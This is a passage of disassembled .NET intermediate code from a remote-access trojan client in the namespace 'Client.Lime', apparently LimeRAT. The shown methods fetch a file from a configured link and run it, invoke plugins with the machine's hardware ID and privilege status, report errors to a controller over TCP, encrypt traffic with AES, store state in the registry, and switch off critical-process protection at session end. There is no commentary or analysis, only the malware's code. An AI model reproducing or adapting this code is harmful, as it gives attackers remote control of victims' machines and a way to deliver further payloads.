      IL_00e6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00eb:  brtrue.s   IL_0132

      IL_00ed:  ldloc.s    V_4
      IL_00ef:  ldnull
      IL_00f0:  ldc.i4.6
      IL_00f1:  newarr     [mscorlib]System.Object
      IL_00f6:  dup
      IL_00f7:  ldc.i4.0
      IL_00f8:  ldsfld     bool Client.Lime.C_Settings::DROP
      IL_00fd:  box        [mscorlib]System.Boolean
      IL_0102:  stelem.ref
      IL_0103:  dup
      IL_0104:  ldc.i4.1
      IL_0105:  ldsfld     string Client.Lime.C_Settings::EXE
      IL_010a:  stelem.ref
      IL_010b:  dup
      IL_010c:  ldc.i4.2
      IL_010d:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_0112:  stelem.ref
      IL_0113:  dup
      IL_0114:  ldc.i4.3
      IL_0115:  call       bool Client.Lime.C_ID::Privileges()
      IL_011a:  box        [mscorlib]System.Boolean
      IL_011f:  stelem.ref
      IL_0120:  dup
      IL_0121:  ldc.i4.4
      IL_0122:  call       string Client.Lime.C_ID::HWID()
      IL_0127:  stelem.ref
      IL_0128:  dup
      IL_0129:  ldc.i4.5
      IL_012a:  ldarg.1
      IL_012b:  stelem.ref
      IL_012c:  callvirt   instance object [mscorlib]System.Reflection.MethodBase::Invoke(object,
                                                                                          object[])
      IL_0131:  pop
      IL_0132:  ldloc.3
      IL_0133:  ldc.i4.1
      IL_0134:  add.ovf
      IL_0135:  stloc.3
      IL_0136:  ldloc.3
      IL_0137:  ldloc.2
      IL_0138:  ldlen
      IL_0139:  conv.i4
      IL_013a:  blt        IL_0028

      IL_013f:  ldloc.1
      IL_0140:  ldc.i4.1
      IL_0141:  add.ovf
      IL_0142:  stloc.1
      IL_0143:  ldloc.1
      IL_0144:  ldloc.0
      IL_0145:  ldlen
      IL_0146:  conv.i4
      IL_0147:  blt        IL_0018

      IL_014c:  leave.s    IL_018c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_014e:  dup
      IL_014f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0154:  stloc.s    V_5
      IL_0156:  ldstr      "MSG"
      IL_015b:  ldsfld     object Client.Lime.C_Commands::SPL
      IL_0160:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_0165:  ldstr      "Plugin Error! "
      IL_016a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_016f:  ldloc.s    V_5
      IL_0171:  callvirt   instance string [mscorlib]System.Exception::get_Message()
      IL_0176:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_017b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0180:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_0185:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_018a:  leave.s    IL_018c

    }  // end handler
    IL_018c:  ret
  } // end of method C_Commands::Plugin

} // end of class Client.Lime.C_Commands

.class public auto ansi Client.Lime.C_Downloader
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_Downloader::.ctor

  .method public static void  Downloader() cil managed
  {
    // Code size       173 (0xad)
    .maxstack  3
    .locals init (class [System]System.Net.WebClient V_0,
             string V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  newobj     instance void [System]System.Net.WebClient::.ctor()
    IL_0005:  stloc.0
    IL_0006:  call       string [mscorlib]System.IO.Path::GetTempFileName()
    IL_000b:  ldsfld     string Client.Lime.C_Settings::DWN_LINK
    IL_0010:  call       string [mscorlib]System.IO.Path::GetFileName(string)
    IL_0015:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_001a:  stloc.1
    .try
    {
      IL_001b:  ldsfld     string Client.Lime.C_Settings::DWN_LINK
      IL_0020:  ldstr      ""
      IL_0025:  ldc.i4.0
      IL_0026:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_002b:  brfalse.s  IL_0083

      IL_002d:  ldsfld     bool Client.Lime.C_Settings::DWN_CHK
      IL_0032:  brfalse.s  IL_0070

      IL_0034:  ldstr      "DWN"
      IL_0039:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_003e:  ldstr      "True"
      IL_0043:  ldc.i4.0
      IL_0044:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0049:  brfalse.s  IL_0083

      IL_004b:  ldloc.0
      IL_004c:  ldsfld     string Client.Lime.C_Settings::DWN_LINK
      IL_0051:  ldloc.1
      IL_0052:  callvirt   instance void [System]System.Net.WebClient::DownloadFile(string,
                                                                                    string)
      IL_0057:  ldloc.1
      IL_0058:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_005d:  pop
      IL_005e:  ldstr      "DWN"
      IL_0063:  ldstr      "True"
      IL_0068:  call       object Client.Lime.C_Fuctions::STV(string,
                                                              string)
      IL_006d:  pop
      IL_006e:  br.s       IL_0083

      IL_0070:  ldloc.0
      IL_0071:  ldsfld     string Client.Lime.C_Settings::DWN_LINK
      IL_0076:  ldloc.1
      IL_0077:  callvirt   instance void [System]System.Net.WebClient::DownloadFile(string,
                                                                                    string)
      IL_007c:  ldloc.1
      IL_007d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0082:  pop
      IL_0083:  nop
      .try
      {
        IL_0084:  ldloc.0
        IL_0085:  callvirt   instance void [System]System.ComponentModel.Component::Dispose()
        IL_008a:  ldnull
        IL_008b:  stloc.0
        IL_008c:  leave.s    IL_009c

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_008e:  dup
        IL_008f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0094:  stloc.2
        IL_0095:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_009a:  leave.s    IL_009c

      }  // end handler
      IL_009c:  leave.s    IL_00ac

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_009e:  dup
      IL_009f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a4:  stloc.3
      IL_00a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00aa:  leave.s    IL_00ac

    }  // end handler
    IL_00ac:  ret
  } // end of method C_Downloader::Downloader

} // end of class Client.Lime.C_Downloader

.class public auto ansi Client.Lime.C_Encryption
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_Encryption::.ctor

  .method public static object  AES_Encrypt(string input) cil managed
  {
    // Code size       123 (0x7b)
    .maxstack  6
    .locals init (object V_0,
             class [mscorlib]System.Security.Cryptography.RijndaelManaged V_1,
             class [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider V_2,
             uint8[] V_3,
             uint8[] V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.RijndaelManaged::.ctor()
    IL_0005:  stloc.1
    IL_0006:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_000b:  stloc.2
    .try
    {
      IL_000c:  ldc.i4.s   32
      IL_000e:  newarr     [mscorlib]System.Byte
      IL_0013:  stloc.3
      IL_0014:  ldloc.2
      IL_0015:  ldsfld     string Client.Lime.C_Settings::EncryptionKey
      IL_001a:  call       uint8[] Client.Lime.C_Fuctions::SB(string)
      IL_001f:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
      IL_0024:  dup
      IL_0025:  ldc.i4.0
      IL_0026:  ldloc.3
      IL_0027:  ldc.i4.0
      IL_0028:  ldc.i4.s   16
      IL_002a:  call       void [mscorlib]System.Array::Copy(class [mscorlib]System.Array,
                                                             int32,
                                                             class [mscorlib]System.Array,
                                                             int32,
                                                             int32)
      IL_002f:  ldc.i4.0
      IL_0030:  ldloc.3
      IL_0031:  ldc.i4.s   15
      IL_0033:  ldc.i4.s   16
      IL_0035:  call       void [mscorlib]System.Array::Copy(class [mscorlib]System.Array,
                                                             int32,
                                                             class [mscorlib]System.Array,
                                                             int32,
                                                             int32)
      IL_003a:  ldloc.1
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance void [mscorlib]System.Security.Cryptography.SymmetricAlgorithm::set_Key(uint8[])
      IL_0041:  ldloc.1
      IL_0042:  ldc.i4.2
      IL_0043:  callvirt   instance void [mscorlib]System.Security.Cryptography.SymmetricAlgorithm::set_Mode(valuetype [mscorlib]System.Security.Cryptography.CipherMode)
      IL_0048:  ldloc.1
      IL_0049:  callvirt   instance class [mscorlib]System.Security.Cryptography.ICryptoTransform [mscorlib]System.Security.Cryptography.SymmetricAlgorithm::CreateEncryptor()
      IL_004e:  ldarg.0
      IL_004f:  call       uint8[] Client.Lime.C_Fuctions::SB(string)
      IL_0054:  stloc.s    V_4
      IL_0056:  ldloc.s    V_4
      IL_0058:  ldc.i4.0
      IL_0059:  ldloc.s    V_4
      IL_005b:  ldlen
      IL_005c:  conv.i4
      IL_005d:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.ICryptoTransform::TransformFinalBlock(uint8[],
                                                                                                                         int32,
                                                                                                                         int32)
      IL_0062:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
      IL_0067:  stloc.0
      IL_0068:  leave.s    IL_0079

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006a:  dup
      IL_006b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0070:  stloc.s    V_5
      IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0077:  leave.s    IL_0079

    }  // end handler
    IL_0079:  ldloc.0
    IL_007a:  ret
  } // end of method C_Encryption::AES_Encrypt

  .method public static object  AES_Decrypt(string input) cil managed
  {
    // Code size       123 (0x7b)
    .maxstack  6
    .locals init (object V_0,
             class [mscorlib]System.Security.Cryptography.RijndaelManaged V_1,
             class [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider V_2,
             uint8[] V_3,
             uint8[] V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.RijndaelManaged::.ctor()
    IL_0005:  stloc.1
    IL_0006:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_000b:  stloc.2
    .try
    {
      IL_000c:  ldc.i4.s   32
      IL_000e:  newarr     [mscorlib]System.Byte
      IL_0013:  stloc.3
      IL_0014:  ldloc.2
      IL_0015:  ldsfld     string Client.Lime.C_Settings::EncryptionKey
      IL_001a:  call       uint8[] Client.Lime.C_Fuctions::SB(string)
      IL_001f:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
      IL_0024:  dup
      IL_0025:  ldc.i4.0
      IL_0026:  ldloc.3
      IL_0027:  ldc.i4.0
      IL_0028:  ldc.i4.s   16
      IL_002a:  call       void [mscorlib]System.Array::Copy(class [mscorlib]System.Array,
                                                             int32,
                                                             class [mscorlib]System.Array,
                                                             int32,
                                                             int32)
      IL_002f:  ldc.i4.0
      IL_0030:  ldloc.3
      IL_0031:  ldc.i4.s   15
      IL_0033:  ldc.i4.s   16
      IL_0035:  call       void [mscorlib]System.Array::Copy(class [mscorlib]System.Array,
                                                             int32,
                                                             class [mscorlib]System.Array,
                                                             int32,
                                                             int32)
      IL_003a:  ldloc.1
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance void [mscorlib]System.Security.Cryptography.SymmetricAlgorithm::set_Key(uint8[])
      IL_0041:  ldloc.1
      IL_0042:  ldc.i4.2
      IL_0043:  callvirt   instance void [mscorlib]System.Security.Cryptography.SymmetricAlgorithm::set_Mode(valuetype [mscorlib]System.Security.Cryptography.CipherMode)
      IL_0048:  ldloc.1
      IL_0049:  callvirt   instance class [mscorlib]System.Security.Cryptography.ICryptoTransform [mscorlib]System.Security.Cryptography.SymmetricAlgorithm::CreateDecryptor()
      IL_004e:  ldarg.0
      IL_004f:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0054:  stloc.s    V_4
      IL_0056:  ldloc.s    V_4
      IL_0058:  ldc.i4.0
      IL_0059:  ldloc.s    V_4
      IL_005b:  ldlen
      IL_005c:  conv.i4
      IL_005d:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.ICryptoTransform::TransformFinalBlock(uint8[],
                                                                                                                         int32,
                                                                                                                         int32)
      IL_0062:  call       string Client.Lime.C_Fuctions::BS(uint8[])
      IL_0067:  stloc.0
      IL_0068:  leave.s    IL_0079

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006a:  dup
      IL_006b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0070:  stloc.s    V_5
      IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0077:  leave.s    IL_0079

    }  // end handler
    IL_0079:  ldloc.0
    IL_007a:  ret
  } // end of method C_Encryption::AES_Decrypt

} // end of class Client.Lime.C_Encryption

.class private auto ansi sealed Client.Lime.C_Fuctions
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public static uint8[]  SB(string s) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000b:  ret
  } // end of method C_Fuctions::SB

  .method public static string  BS(uint8[] b) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000b:  ret
  } // end of method C_Fuctions::BS

  .method public static object  DLV(string n) cil managed
  {
    // Code size       49 (0x31)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0005:  ldstr      "Software\\"
      IL_000a:  call       string Client.Lime.C_ID::HWID()
      IL_000f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0014:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0019:  ldarg.0
      IL_001a:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_001f:  leave.s    IL_002f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0021:  dup
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0027:  stloc.1
      IL_0028:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002d:  leave.s    IL_002f

    }  // end handler
    IL_002f:  ldloc.0
    IL_0030:  ret
  } // end of method C_Fuctions::DLV

  .method public static string  GTV(string n) cil managed
  {
    // Code size       62 (0x3e)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0005:  ldstr      "Software\\"
      IL_000a:  call       string Client.Lime.C_ID::HWID()
      IL_000f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0014:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0019:  ldarg.0
      IL_001a:  ldstr      ""
      IL_001f:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0024:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0029:  stloc.0
      IL_002a:  leave.s    IL_003c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.1
      IL_0033:  ldnull
      IL_0034:  stloc.0
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003a:  leave.s    IL_003c

    }  // end handler
    IL_003c:  ldloc.0
    IL_003d:  ret
  } // end of method C_Fuctions::GTV

  .method public static object  STV(string n,
                                    string t) cil managed
  {
    // Code size       64 (0x40)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0005:  ldstr      "Software\\"
      IL_000a:  call       string Client.Lime.C_ID::HWID()
      IL_000f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0014:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0019:  ldarg.0
      IL_001a:  ldarg.1
      IL_001b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0020:  ldc.i4.1
      IL_0021:  box        [mscorlib]System.Boolean
      IL_0026:  stloc.0
      IL_0027:  leave.s    IL_003e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0029:  dup
      IL_002a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_002f:  stloc.1
      IL_0030:  ldc.i4.0
      IL_0031:  box        [mscorlib]System.Boolean
      IL_0036:  stloc.0
      IL_0037:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003c:  leave.s    IL_003e

    }  // end handler
    IL_003e:  ldloc.0
    IL_003f:  ret
  } // end of method C_Fuctions::STV

  .method public static class [mscorlib]System.Array 
          fx(uint8[] b,
             string WRD) cil managed
  {
    // Code size       131 (0x83)
    .maxstack  7
    .locals init (class [mscorlib]System.IO.MemoryStream V_0,
             class [mscorlib]System.IO.MemoryStream V_1,
             string[] V_2)
    IL_0000:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::.ctor()
    IL_0005:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_000a:  stloc.0
    IL_000b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0010:  stloc.1
    IL_0011:  ldarg.0
    IL_0012:  call       string Client.Lime.C_Fuctions::BS(uint8[])
    IL_0017:  ldarg.1
    IL_0018:  ldc.i4.m1
    IL_0019:  ldc.i4.0
    IL_001a:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_001f:  stloc.2
    IL_0020:  ldloc.0
    IL_0021:  ldarg.0
    IL_0022:  ldc.i4.0
    IL_0023:  ldloc.2
    IL_0024:  ldc.i4.0
    IL_0025:  ldelem.ref
    IL_0026:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_002b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0030:  ldloc.1
    IL_0031:  ldarg.0
    IL_0032:  ldloc.2
    IL_0033:  ldc.i4.0
    IL_0034:  ldelem.ref
    IL_0035:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_003a:  ldarg.1
    IL_003b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0040:  add.ovf
    IL_0041:  ldarg.0
    IL_0042:  ldlen
    IL_0043:  conv.i4
    IL_0044:  ldloc.2
    IL_0045:  ldc.i4.0
    IL_0046:  ldelem.ref
    IL_0047:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_004c:  ldarg.1
    IL_004d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0052:  add.ovf
    IL_0053:  sub.ovf
    IL_0054:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0059:  dup
    IL_005a:  ldloc.0
    IL_005b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0060:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::Add(!0)
    IL_0065:  dup
    IL_0066:  ldloc.1
    IL_0067:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_006c:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::Add(!0)
    IL_0071:  ldloc.0
    IL_0072:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0077:  ldloc.1
    IL_0078:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_007d:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<uint8[]>::ToArray()
    IL_0082:  ret
  } // end of method C_Fuctions::fx

  .method public static void  Handler_SessionEnding(object sender,
                                                    class [System]Microsoft.Win32.SessionEndingEventArgs e) cil managed
  {
    // Code size       30 (0x1e)
    .maxstack  8
    IL_0000:  ldarg.1
    IL_0001:  callvirt   instance valuetype [System]Microsoft.Win32.SessionEndReasons [System]Microsoft.Win32.SessionEndingEventArgs::get_Reason()
    IL_0006:  ldc.i4.1
    IL_0007:  bne.un.s   IL_000f

    IL_0009:  call       void Client.Lime.C_CriticalProcess::CriticalProcesses_Disable()
    IL_000e:  ret

    IL_000f:  ldarg.1
    IL_0010:  callvirt   instance valuetype [System]Microsoft.Win32.SessionEndReasons [System]Microsoft.Win32.SessionEndingEventArgs::get_Reason()
    IL_0015:  ldc.i4.2
    IL_0016:  bne.un.s   IL_001d

    IL_0018:  call       void Client.Lime.C_CriticalProcess::CriticalProcesses_Disable()
    IL_001d:  ret
  } // end of method C_Fuctions::Handler_SessionEnding

  .method public static uint8[]  GZip(uint8[] B,
                                      bool& CM) cil managed
  {
    // Code size       236 (0xec)
    .maxstack  5
    .locals init (uint8[] V_0,
             uint8[] V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             uint8[] V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             class [System]System.IO.Compression.GZipStream V_5,
             uint8[] V_6,
             int32 V_7)
    IL_0000:  ldarg.1
    IL_0001:  ldind.u1
    IL_0002:  brfalse.s  IL_0064

    IL_0004:  ldnull
    IL_0005:  stloc.1
    IL_0006:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_000b:  stloc.2
    .try
    {
      IL_000c:  ldloc.2
      IL_000d:  ldc.i4.1
      IL_000e:  ldc.i4.1
      IL_000f:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                         valuetype [System]System.IO.Compression.CompressionMode,
                                                                                         bool)
      IL_0014:  dup
      IL_0015:  ldarg.0
      IL_0016:  ldc.i4.0
      IL_0017:  ldarg.0
      IL_0018:  ldlen
      IL_0019:  conv.i4
      IL_001a:  callvirt   instance void [System]System.IO.Compression.GZipStream::Write(uint8[],
                                                                                         int32,
                                                                                         int32)
      IL_001f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0024:  ldloc.2
      IL_0025:  ldc.i4.0
      IL_0026:  conv.i8
      IL_0027:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
      IL_002c:  ldloc.2
      IL_002d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0032:  conv.ovf.i4
      IL_0033:  ldc.i4.1
      IL_0034:  add.ovf
      IL_0035:  ldc.i4.1
      IL_0036:  sub.ovf
      IL_0037:  ldc.i4.1
      IL_0038:  add.ovf
      IL_0039:  newarr     [mscorlib]System.Byte
      IL_003e:  stloc.1
      IL_003f:  ldloc.2
      IL_0040:  ldloc.1
      IL_0041:  ldc.i4.0
      IL_0042:  ldloc.1
      IL_0043:  ldlen
      IL_0044:  conv.i4
      IL_0045:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_004a:  pop
      IL_004b:  ldloc.2
      IL_004c:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0051:  leave.s    IL_005d

    }  // end .try
    finally
    {
      IL_0053:  ldloc.2
      IL_0054:  brfalse.s  IL_005c

      IL_0056:  ldloc.2
      IL_0057:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_005c:  endfinally
    }  // end handler
    IL_005d:  ldloc.1
    IL_005e:  stloc.0
    IL_005f:  br         IL_00ea

    IL_0064:  ldnull
    IL_0065:  stloc.3
    IL_0066:  ldarg.0
    IL_0067:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_006c:  stloc.s    V_4
    .try
    {
      IL_006e:  ldloc.s    V_4
      IL_0070:  ldc.i4.0
      IL_0071:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                         valuetype [System]System.IO.Compression.CompressionMode)
      IL_0076:  stloc.s    V_5
      IL_0078:  ldc.i4.4
      IL_0079:  newarr     [mscorlib]System.Byte
      IL_007e:  stloc.s    V_6
      IL_0080:  ldloc.s    V_4
      IL_0082:  ldloc.s    V_4
      IL_0084:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0089:  ldc.i4.5
      IL_008a:  conv.i8
      IL_008b:  sub.ovf
      IL_008c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
      IL_0091:  ldloc.s    V_4
      IL_0093:  ldloc.s    V_6
      IL_0095:  ldc.i4.0
      IL_0096:  ldc.i4.4
      IL_0097:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_009c:  pop
      IL_009d:  ldloc.s    V_6
      IL_009f:  ldc.i4.0
      IL_00a0:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                        int32)
      IL_00a5:  stloc.s    V_7
      IL_00a7:  ldloc.s    V_4
      IL_00a9:  ldc.i4.0
      IL_00aa:  conv.i8
      IL_00ab:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
      IL_00b0:  ldloc.s    V_7
      IL_00b2:  ldc.i4.1
      IL_00b3:  sub.ovf
      IL_00b4:  ldc.i4.1
      IL_00b5:  add.ovf
      IL_00b6:  ldc.i4.1
      IL_00b7:  sub.ovf
      IL_00b8:  ldc.i4.1
      IL_00b9:  add.ovf
      IL_00ba:  newarr     [mscorlib]System.Byte
      IL_00bf:  stloc.3
      IL_00c0:  ldloc.s    V_5
      IL_00c2:  ldloc.3
      IL_00c3:  ldc.i4.0
      IL_00c4:  ldloc.s    V_7
      IL_00c6:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                         int32,
                                                                                         int32)
      IL_00cb:  pop
      IL_00cc:  ldloc.s    V_5
      IL_00ce:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_00d3:  ldloc.s    V_4
      IL_00d5:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_00da:  leave.s    IL_00e8

    }  // end .try
    finally
    {
      IL_00dc:  ldloc.s    V_4
      IL_00de:  brfalse.s  IL_00e7

      IL_00e0:  ldloc.s    V_4
      IL_00e2:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00e7:  endfinally
    }  // end handler
    IL_00e8:  ldloc.3
    IL_00e9:  stloc.0
    IL_00ea:  ldloc.0
    IL_00eb:  ret
  } // end of method C_Fuctions::GZip

  .method public static pinvokeimpl("kernel32.dll" autochar lasterr winapi bestfit:off charmaperror:on) 
